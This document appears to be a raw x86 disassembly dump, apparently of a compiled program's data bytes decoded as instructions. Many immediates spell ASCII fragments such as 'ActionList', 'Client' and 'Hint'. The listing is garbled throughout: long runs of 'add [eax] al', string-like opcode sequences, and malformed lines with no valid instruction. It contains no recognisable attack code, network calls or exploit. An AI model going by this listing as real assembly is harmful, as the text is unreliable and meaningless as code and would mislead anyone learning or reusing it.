add [ eax + edi * 4 - 0x4853ffb9 ] dl
inc edi
add [ eax ] dh
mov esp 0xbcf00047
inc edi
add [ eax - 0x5fffbded ] ch
adc al 0x42
add ah ah
insb
mov al [ gs : 0x700479a ]
andps xmm0 [ ecx + 0x63 ]
je r-xdata
pop eax
mov bh 0x47
outsd
outsb
inc edx
popad
jb r-xdata
add al 0x35
inc eax
add al bh
xor al 0x40
je r-xdata
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ esi + esi * 4 + 0x47 ] dl
add [ eax - 0x3b ] al
inc edi
add al bh
rol [ edi ] 0x7c
retn
test al 0x13
inc edx
add [ eax - 0x1bffbdec ] ah
insb
sbb [ gs : edx + 0x11040047 ] 0x40
add [ eax ] al
add [ edi ] al
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
add [ eax ] al
lea eax [ eax ]
adc al 0x9b
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x65 ] dl
inc edi
add [ eax + 0x479b ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x65 ] ch
inc edi
add [ ebx + ebx * 4 + 0xcc0047 ] al
add [ eax ] al
jl r-xdata
xor al [ eax ]
pop esp
xor al [ eax ]
cwde
xor al [ eax ]
test al 0x2a
inc eax
add [ eax - 0x57ffbfd6 ] ch
sub al [ eax ]
andps xmm0 [ ecx + 0x63 ]
je r-xdata
add ah cl
push ss
inc edx
add [ eax ] al
enter 0x47 0xc
adc [ edx ] al
inc ebp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x49 ] bl
inc edi
add [ eax + edx ] cl
inc edx
add [ esi + 0x34f80040 ] al
inc eax
outsb
inc edx
popad
jb r-xdata
outsd
sub_479b74
fadd st5
inc edi
add [ esi + eax * 8 ] cl
inc edi
add [ eax - 0x3b ] ah
inc edi
add [ ebp + eax * 8 + 0x54140047 ] bl
inc ebx
jne r-xdata
add al cl
inc edi
add [ eax + edx ] cl
inc edx
add [ esi + 0x34f80040 ] al
inc eax
je r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x49 ] bl
inc edi
inc edx
add [ eax ] al
enter 0x47 0xc
adc [ edx ] al
add al 0x35
inc eax
add al bh
xor al 0x40
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec ebp
popad
outsb
popad
jb r-xdata
add [ eax - 0x5fffbded ] ch
adc al 0x42
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ esi + esi * 4 + 0x47 ] dl
add [ eax - 0x3b ] al
inc edi
add al bh
rol [ edi ] 0x7c
retn
inc eax
add [ eax + 0x700479b ] ah
adc al 0x54
inc ebx
jne r-xdata
nop
inc ecx
add [ eax + edi * 4 - 0x4853ffb9 ] dl
inc edi
add [ eax ] dh
mov esp 0xbcf00047
inc edi
add [ eax - 0x5fffbded ] ch
adc al 0x42
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ esi + esi * 4 + 0x47 ] dl
add [ eax - 0x3b ] al
inc edi
add al bh
rol [ edi ] 0x7c
retn
je r-xdata
add [ eax ] cl
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec ebp
popad
outsb
popad
jb r-xdata
rcr [ eax ] 0x9c
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] ch
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx * 4 + 0x47 ] dl
add al dl
add [ eax ] al
add al cl
0x16cc0047 0x42
fwait
inc edi
add [ esp + eax * 4 ] ch
inc ebp
add [ edx ] al
add [ edi ] al
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
add [ eax ] al
mov eax eax
sbb [ edi + eax * 2 ] bl
sub_479de0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f11000b ] al
outsb
inc edi
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
popad
jb r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
imul esp [ ebp + 0x6e ] 0x6c437374
popad
jae r-xdata
or eax 0x6e4f1100
je r-xdata
add [ edi + ebx * 4 + 0x47 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jbe r-xdata
popad
je r-xdata
inc ebx
mov [ ecx + 0xb00047 ] ds
add bh bh
mov al 0x0
add bh bh
add [ eax ] eax
insd
inc ebx
insb
popad
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x4f0d0010 ] al
outsb
push ebx
je r-xdata
inc edi
add [ eax + eax ] dl
add [ eax ] al
inc eax
arpl [ ecx ] ax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x61 ] dh
mov ah 0x5a
inc ecx
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] dl
add [ eax ] al
andps xmm0 [ ecx + 0x63 ]
je r-xdata
insb
inc ebx
push 0x65676e61
add [ eax - 0x80000000 ] al
adc [ eax ] al
or eax 0x74536e4f
popad
insb
imul esp [ ebp + 0x6e ] 0x65744974
insd
inc ebx
insb
popad
jae r-xdata
je r-xdata
pushad
cwde
inc edi
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000c ] al
outsb
inc edi
je r-xdata
add ah bh
xor al 0x40
add [ eax ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070001 ] al
popad
jo r-xdata
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
mov eax eax
mov [ edi + 0xf070047 ] ds
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
inc esp
lahf
inc edi
add ah cl
arpl [ ecx ] ax
add al [ eax ]
pop es
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
add al [ eax ]
sub al 0x84
inc ebp
add [ eax + eax ] cl
add bh bh
cmp al 0xca
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410a0000 ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
aam 0xc9
inc edi
add [ eax ] dl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ ebx + edx * 4 + 0x41 ] ah
add [ eax ] cl
nop
inc ecx
add [ eax ] dl
nop
inc ecx
add [ ecx + ecx * 8 ] cl
inc edi
add [ edx + ecx * 8 ] dl
inc edi
add [ eax - 0x1fffbe6c ] dh
xchg esp eax
inc ecx
add al bl
xchg esp eax
inc ecx
add [ ebx + edx * 4 ] ch
inc ecx
add [ esi ] cl
add [ eax ] al
push 0x65676e61
cld
cdq
inc edi
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0011 ] al
outsb
push ebx
je r-xdata
inc ebx
nop
inc esp
lahf
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx * 4 + 0x47 ] ah
in al 0x82
inc ebp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
add [ edi + ecx * 2 ] dl
outsb
inc edi
popad
jb r-xdata
xchg esi eax
inc ecx
add [ 0x74634154 ] dl
imul ebp [ edi + 0x6e ] 0x7473694c
inc ebx
outsd
insb
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
mov [ eax + 0x15070047 ] ah
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x6c6c6f43
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc esp
mov al [ 0x655c0047 ]
inc ecx
add [ eax ] al
add [ edi ] al
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
add [ eax ] al
nop
add [ ecx + 0x47 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
mov eax [ 0x47 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ ecx + 0x280047 ] ah
add [ eax ] al
int3
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ eax + 0x47 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
mov al [ 0x1c0047 ]
add [ eax ] al
int3
add [ eax ] 0x0
add [ eax + 0x4f08000f ] al
inc ebx
insb
popad
jae r-xdata
outsb
push ebp
jo r-xdata
str [ eax ]
dec edi
inc edi
je r-xdata
and al 0x99
inc edi
add [ eax - 0x47010000 ] bh
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f11000d ] al
outsb
sub_479f25
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ ebx + edx * 4 + 0x41 ] ah
add [ eax ] cl
nop
inc ecx
add [ eax ] dl
nop
inc ecx
add [ ecx + ecx * 8 ] cl
inc edi
add [ edx + ecx * 8 ] dl
inc edi
add [ eax - 0x1fffbe6c ] dh
xchg esp eax
inc ecx
add al bl
xchg esp eax
inc ecx
add [ ebx + edx * 4 ] ch
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] dl
add [ eax ] al
andps xmm0 [ ecx + 0x63 ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070001 ] al
popad
jo r-xdata
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
mov eax eax
mov [ edi + 0xf070047 ] ds
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
inc esp
lahf
inc edi
add ah cl
arpl [ ecx ] ax
add al [ eax ]
pop es
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
add al [ eax ]
sub al 0x84
inc ebp
add [ eax + eax ] cl
add bh bh
cmp al 0xca
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410a0000 ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
aam 0xc9
inc edi
add [ eax ] dl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
xchg esi eax
inc ecx
add [ 0x74634154 ] dl
imul ebp [ edi + 0x6e ] 0x7473694c
inc ebx
outsd
insb
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
mov [ eax + 0x15070047 ] ah
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x6c6c6f43
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc esp
mov al [ 0x655c0047 ]
inc ecx
add [ eax ] al
add [ edi ] al
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
add [ eax ] al
nop
add [ ecx + 0x47 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
mov eax [ 0x47 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ ecx + 0x280047 ] ah
add [ eax ] al
int3
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ eax + 0x47 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
mov al [ 0x1c0047 ]
add [ eax ] al
int3
sub_47a2b5
fiadd [ edi ]
or bl bl
inc edi
add [ eax + ebx * 8 + 0xe0047 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
and [ eax ] al
add [ eax ] al
or eax 0x74634154
imul ebp [ edi + 0x6e ] 0x65696c43
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x200040 ] dl
mov [ 0xd070047 ] al
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x47a28c74
add ah cl
arpl [ ecx ] ax
or [ eax ] al
pop es
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
or [ eax ] al
and [ edx + 0x310047 ] ah
add bh bh
and al 0x0
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x7 ] al
add [ eax ] al
push cs
inc ebx
push 0x65676e61
jae r-xdata
inc ebx
insb
insb
outsd
ja r-xdata
inc edi
add [ eax ] al
js r-xdata
arpl [ ebx + 0x67 ] bp
jb r-xdata
and [ fs : esi ] 0x42
add [ eax + eax ] ah
add bh bh
sub [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x20000000 ] al
inc edi
add [ eax + eax ] bh
add [ eax ] al
inc eax
mov [ 0x34f00047 ] al
inc eax
insd
jae r-xdata
dec ecx
je r-xdata
add [ eax ] dh
add [ eax ] al
[ eax + eax ]
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
adc [ edx + 0x61 ] al
arpl [ ebx + 0x67 ] bp
jb r-xdata
outsd
outsb
je r-xdata
cmpsd [ esi ] [ edi ]
inc edi
add [ esi + edx * 8 ] bh
inc edi
add [ ebx + ebx * 8 ] al
inc edi
add [ esp + edx * 8 + 0x47 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c0002 ] al
je r-xdata
je r-xdata
bound ebp [ ebp - 0x70 ]
adc [ eax ] al
xor al 0x0
add bh bh
xor al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ ebx ] al
push esp
popad
add [ bx + si ] dl
inc eax
add [ eax ] 0x0
add [ eax + 0x49050005 ] al
je r-xdata
insd
jae r-xdata
je r-xdata
xor [ eax ] al
add bh bh
sub al 0x0
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
pop es
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x90656c62
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x47 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0xa4
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les esp [ ebp + 0x300047 ]
add [ eax ] al
mov ah 0xa0
inc edi
add al dh
xor al 0x40
outsd
add [ ecx ] cl
add [ eax ] cl
inc ecx
jne r-xdata
insd
nop
mov esp 0x70047a4
push cs
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc edx
popad
jb r-xdata
add [ eax + 0x680047d9 ] ch
fadd [ edi ]
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x74490500
insd
inc edi
add [ eax ] al
jb r-xdata
outsd
insb
outsd
xor al [ edx ]
sbb al 0xd6
inc edi
add al al
fld [ edi ]
in al dx
xlat
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x420a0003 ] al
popad
add [ eax ] eax
add eax 0x6f6c6f43
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] ah
inc edi
add [ eax + eax ] dl
add bh bh
cmp al 0xda
inc edi
add [ ecx ] al
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax ] dl
aam 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
popad
jns r-xdata
jae r-xdata
aam 0xa5
inc edi
add [ edi ] al
or edx [ ecx + eax * 2 + 0x63 ]
je r-xdata
adc [ eax ] al
cmp [ eax ] al
add bh bh
fcomp st3
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ ebp + edx * 4 + 0x41 ] bl
add [ eax ] cl
nop
inc ecx
add [ eax ] dl
nop
inc ecx
add al cl
xchg ebp eax
inc ecx
add [ edx + ebx * 4 + 0x41 ] ah
add [ eax - 0x66 ] ch
inc ecx
add al ch
fld [ edi ]
and [ edx - 0x65dbffbf ] bl
inc eax
outsd
or [ eax ] eax
or [ ecx + 0x75 ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
je r-xdata
add [ eax ] al
add [ eax ] al
mov esp 0x47a4
jne r-xdata
add [ eax ] al
add eax [ eax ]
or [ ebx + 0x68 ] edx
outsd
ja r-xdata
adc [ eax ] al
sub [ eax ] al
add bh bh
sub [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
cmp al 0x10
inc eax
add [ eax ] ch
add [ eax ] al
[ eax ]
outsd
outsb
inc edx
popad
jb r-xdata
inc eax
add [ edx + esi + 0x40 ] bl
push ebx
imul edi [ edx + 0x65 ] sub_435b34
cmp [ eax ] eax
add bh bh
clc
inc ecx
add [ eax - 0x6a ] ah
inc ecx
add ah bl
inc ecx
add [ edx + ebx * 4 ] ah
push 0x6f79614c
jne r-xdata
fild [ edi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax [ edi + 0x6c ]
jns r-xdata
insd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3c0047a4 ] ch
add [ eax ] al
add [ eax - 0x5e ] al
inc edi
add al dh
xor al 0x40
add [ eax ] al
add [ eax ] al
pop eax
cmpsd [ esi ] [ edi ]
inc edi
add [ eax - 0x57ffb82a ] dh
fld [ edi ]
push 0x47d8
nop
and [ edi + 0x47 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
cmpsd [ esi ] [ edi ]
inc edi
imul ebp [ esi + 0x74 ] 0xa6949073
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x59 ] cl
inc edi
add [ eax + eax ] ch
add [ eax ] al
mov ah 0xa0
inc edi
add al dh
xor al 0x40
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x47 ] bl
imul ebp [ edi + 0x6e ] 0x6e756f43
je r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
or al 0x53
jae r-xdata
pushfd
movsd [ edi ] [ esi ]
inc edi
add [ ecx + 0x47 ] al
add [ eax + eax ] al
pop es
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
add al 0x0
add [ eax ] dl
inc eax
add [ eax + eax ] ah
add bh bh
and al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] al
or al 0x43
jne r-xdata
xchg esi eax
inc ecx
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc edx
popad
jb r-xdata
add [ edx + edx * 8 ] dh
inc edi
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
lea eax [ eax ]
pushfd
movsd [ edi ] [ esi ]
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
movsd [ edi ] [ esi ]
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
movsd [ edi ] [ esi ]
inc edi
add [ eax ] dh
add [ eax ] al
add [ eax + 0x34f00047 ] dh
inc eax
add [ eax ] cl
nop
inc ecx
add [ eax ] dl
nop
inc ecx
add al al
aam 0x47
add [ ebx + ebx * 8 + 0x47 ] bh
add [ eax - 0x1fffbe6c ] dh
xchg esp eax
inc ecx
add al bl
xchg esp eax
inc ecx
add [ eax - 0x25 ] al
inc edi
add [ eax ] bl
fild [ edi ]
fcomp st2
inc edi
add al dh
fiadd [ edi ]
add al 0xdd
inc edi
add al al
fild [ edi ]
push cs
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc edx
popad
jb r-xdata
inc edi
outsb
inc edx
popad
jb r-xdata
inc edi
add al ah
mov [ 0xb0047 ] al
pop es
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
add eax [ eax ]
movsb [ edi ] [ esi ]
mov al 0x47
add [ eax + eax ] cl
add bh bh
mov eax 0x10047d8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41090008 ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
imul esp [ ebp + 0x55 ] 0x6573756e
nop
dec ebp
popad
outsb
add eax 0x40100000
add [ eax + eax ] bl
add bh bh
mov al [ 0x10047d3 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
or eax [ ecx + 0x75 ]
je r-xdata
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ ebp + edx * 4 + 0x41 ] bl
add [ eax ] cl
nop
inc ecx
add [ eax ] dl
nop
inc ecx
add [ eax + 0x640047de ] bh
0x9a680041 0x41
movsb [ edi ] [ esi ]
fild [ edi ]
and [ edx - 0x65dbffbf ] bl
inc ecx
add [ eax - 0x6a ] ah
inc ecx
add ah bl
xchg esi eax
inc ecx
add [ esi ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x5c907374
cmpsd [ esi ] [ edi ]
inc edi
add [ edi ] al
push cs
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
imul esp [ ebp + 0x6e ] 0xa7207374
inc edi
add [ ecx + 0x47 ] al
add [ 0x63410700 ] al
je r-xdata
imul ebp [ edi + 0x6e ] 0x6974704f
outsd
outsb
jae r-xdata
adc [ eax ] al
sub al 0x0
add bh bh
sub al 0xde
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
push ebx
push 0x6948776f
outsb
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ecx + 0x1c0047 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
push cs
inc ebx
popad
jo r-xdata
dec eax
outsd
je r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x60047a6 ] dl
arpl [ edi + 0x4e ] bp
outsd
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
nop
cmpsb [ esi ] [ edi ]
inc edi
add [ esi ] al
add [ edx + edx * 8 ] dh
inc edi
add [ eax ] al
xor eax 0x35040040
inc eax
inc eax
inc edi
add [ ebx ] al
andps xmm0 [ ebx + 0x61 ]
jo r-xdata
nop
xchg esp eax
cmpsb [ esi ] [ edi ]
add [ ecx ] cl
insd
imul edi [ edx + 0x61 ] 0x656c62
adc [ eax ] al
rcr ch 0x1
inc edi
add [ esi + ebx * 8 + 0x47 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] eax
or eax 0x746e6948
push ebx
push 0x4374726f
jne r-xdata
xor al [ eax ]
mov eax 0x40004217
jecxz r-xdata
imul ebp [ edi + 0x6e ] 0x6974704f
outsd
jne r-xdata
jns r-xdata
outsb
or esp [ gs : ebx + 0x6f ]
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x76 ] si
add eax 0x6c416f63
insb
pop es
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
inc ebp
add [ esi - 0x193bffb9 ] ah
inc edi
add al dh
out 0x47 al
add al bh
xchg edx eax
inc ebp
add [ edi ] dl
inc edi
add [ eax ] al
xchg ebx eax
inc ebp
add [ ebx + edx * 4 ] al
inc ebp
add [ eax ] dh
out 0x47 eax
add [ eax - 0x19 ] bl
inc edi
add [ eax - 0x37ffb819 ] ch
out 0x47 eax
add [ ebx + 0x47 ] bl
add [ ecx ] dl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6e694c74
imul ecx [ ebx + 0x47a920c0 ] 0x0
add [ ebx ] ecx
push esp
dec ebp
jb r-xdata
add ah ch
pop ss
inc edx
add [ eax ] cl
out 0x47 al
add [ eax ] ah
sbb [ edx ] al
js r-xdata
adc [ eax ] al
sub [ eax ] eax
add bh bh
call 0x147f009
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al 0x0
add [ eax ] al
dec esp
mov eax [ ebp ]
add [ eax + eax ] bl
cmpsb [ esi ] [ edi ]
inc edi
add [ eax ] ch
add [ eax ] al
push [ eax ]
loope r-xdata
nop
outsb
jae r-xdata
add [ eax ] dl
inc eax
add [ eax + eax ] ah
add bh bh
and al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] eax
or al 0x43
jne r-xdata
inc edi
add ah ch
jmp r-xdata
push edx
popad
outsb
add eax 0x0
inc edi
add [ eax + 0x17 ] dh
inc edx
add [ eax + ebx ] al
inc edx
add [ eax + 0x18 ] bl
inc edx
add [ esp + 0x47 ] cl
add [ edx + edx * 4 ] dh
inc ebp
add [ eax ] dl
in eax 0x47
add [ edx + edx * 4 + 0x45 ] bl
add [ eax - 0x1b ] dl
inc edi
add [ edx + edx * 4 - 0x1a7fffbb ] al
inc edi
add ah al
in eax 0x47
add [ esi ] bh
inc edi
add [ eax - 0x1a ] dh
inc edi
add al ch
xchg edx eax
add [ eax ] dl
inc eax
add [ edx ] ch
add [ eax ] al
test al 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
test eax 0x1c0047
popad
insb
insb
dec ecx
arpl [ edi + 0x6e ] bp
jae r-xdata
insd
je r-xdata
inc edi
add [ ecx ] dl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x65744974
insd
mov eax eax
hlt
or dl [ ebx + 0x6d ]
insd
imul edi [ edx + 0x61 ] 0x656c62
adc [ eax ] al
sub al [ eax ]
add bh bh
mov esp 0x10047e1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
or cl [ eax + 0x69 ]
push ebp
outsb
sub_47a9d2
cld
inc [ eax + ebp * 8 - 0x14a3ffb9 ]
inc edi
add [ ecx ] dl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x65744974
insd
mov eax eax
hlt
sub_47abb4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ edi + eax * 2 + 0x3c00 ] ch
add ah bh
jo r-xdata
add [ esp + edx * 2 ] dl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc esp
jb r-xdata
add al dh
xor al 0x40
add [ esi + ebx * 4 ] dh
inc esp
